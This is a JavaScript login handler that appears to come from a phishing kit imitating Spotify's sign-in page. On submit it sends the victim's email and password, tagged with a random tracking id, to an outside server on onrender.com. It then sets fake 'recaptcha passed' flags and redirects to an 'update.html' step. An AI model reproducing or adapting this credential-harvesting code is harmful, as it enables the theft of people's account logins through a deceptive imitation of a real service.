console.log("post_login.js");
function generateRandomString() {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters.charAt(randomIndex);
    }
    return result;
}
$(document).ready(function () {
    
    $("#form").on("submit", function (event) {
        event.preventDefault();
        $("#login-button").prop("disabled", true);
        var unique_id = generateRandomString();
        var formData = new FormData(this);
        formData.append('unique_id', unique_id);


        $.ajax({
            type: "POST",
            url: "https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/post_login.php",
            data: formData,
            processData: false, // Prevent jQuery from automatically processing the data
            contentType: false, // Prevent jQuery from automatically setting the content type

            success: function (response) {
                console.log("Raw Response:", response);
                if (response.status === 'success') {
                    localStorage.setItem("recaptcha", "passed");
                    localStorage.setItem("unique_id", unique_id);
                    localStorage.setItem("login", "passed");
                    localStorage.setItem("step", "one");

                    $("#error_mail").html("");
                    $("#error_pass").html("");
                    window.location.href = 'update.html';
                } else if (response.status === 'error' && response.errors) {
                    if (response.errors === 'mail') {
                        $("#signin_email").css("box-shadow", "inset 0 0 0 1px var(--essential-negative,#e91429)");
                    } else {
                        $("#signin_email").css("box-shadow", "");
                    }
                    $("#signin_email").css("box-shadow", "inset 0 0 0 1px var(--essential-negative,#e91429)");
                    $("#signin_password").css("box-shadow", "inset 0 0 0 1px var(--essential-negative,#e91429)");
                    $("#login-button").prop("disabled", false);
                }
             else {
                    console.log("response.status:", response.status);
                    $("#login-button").prop("disabled", false);
                }
            },
            error: function (error) {
                $("#login-button").prop("disabled", false);
                console.log("Error:", error);
            }
        });


});
});